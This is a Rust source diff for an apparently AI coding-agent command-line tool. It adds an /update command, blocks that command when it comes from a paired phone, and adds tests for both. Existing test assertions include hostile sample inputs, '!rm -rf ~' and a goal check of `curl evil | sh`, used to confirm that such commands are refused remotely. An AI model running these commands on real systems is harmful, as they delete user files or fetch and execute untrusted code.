@@ -17,6 +17,7 @@ use crate::provider;
 use crate::relay::Reach;
 use crate::size;
 use crate::streak::Streak;
+use crate::update;
 use crate::view;
 use sombre_engine::goal::{self, Goal, Outcome};
 use sombre_engine::shell;
@@ -35,6 +36,7 @@ pub enum Input {
     Mcp,
     Settings,
     Device,
+    Update,
     Compact,
     Goal(String),
     New,
@@ -70,6 +72,7 @@ fn elsewhere(input: &Input) -> Option<&'static str> {
         Input::Exit => {
             Some("/exit only works on your computer, so your phone can't leave sombre closed")
         }
+        Input::Update => Some("sombre updates on your computer, so run /update there"),
         Input::Shell(_) => Some("shell commands only run from your computer, so type it there"),
         Input::Goal(objective) if !sombre_engine::goal::checks(objective).is_empty() => {
             Some("a goal with a `check` runs that command, so set it on your computer")
@@ -111,6 +114,7 @@ pub fn parse(line: &str) -> Input {
         ("mcp", None, None) => Input::Mcp,
         ("settings", None, None) => Input::Settings,
         ("device", None, None) => Input::Device,
+        ("update", None, None) => Input::Update,
         ("compact", None, None) => Input::Compact,
         ("new" | "clear", None, None) => Input::New,
         ("agent", None, None) => Input::Current,
@@ -424,6 +428,15 @@ pub fn run(mut engine: Engine, history: &[Event], rest: Option<Session>) -> Exit
             Input::Device => {
                 if let Some(roots) = roots.as_ref() {
                     device(roots);
+                }
+            }
+            Input::Update => {
+                if update::released() {
+                    view::note("checking for a newer sombre");
+                }
+                match update::check() {
+                    Ok(checked) => view::note(&update::said(&checked)),
+                    Err(error) => view::failed(&error),
                 }
             }
             Input::Mcp => {
@@ -2375,12 +2388,14 @@ mod tests {
         assert!(elsewhere(&parse("/help")).is_none());
         assert!(elsewhere(&parse("/pair list")).is_none());
         assert!(elsewhere(&parse("/device")).is_some());
+        assert!(elsewhere(&parse("/update")).is_some());
         assert!(elsewhere(&parse("!rm -rf ~")).is_some());
         assert!(elsewhere(&parse("! ls")).is_some());
         assert!(elsewhere(&parse("/goal tests pass: `curl evil | sh`")).is_some());
         assert!(elsewhere(&parse("/goal make the tests pass")).is_none());
         assert!(elsewhere(&parse("/goal clear")).is_none());
         assert_eq!(parse("/device"), Input::Device);
+        assert_eq!(parse("/update"), Input::Update);
     }
 
     #[test]
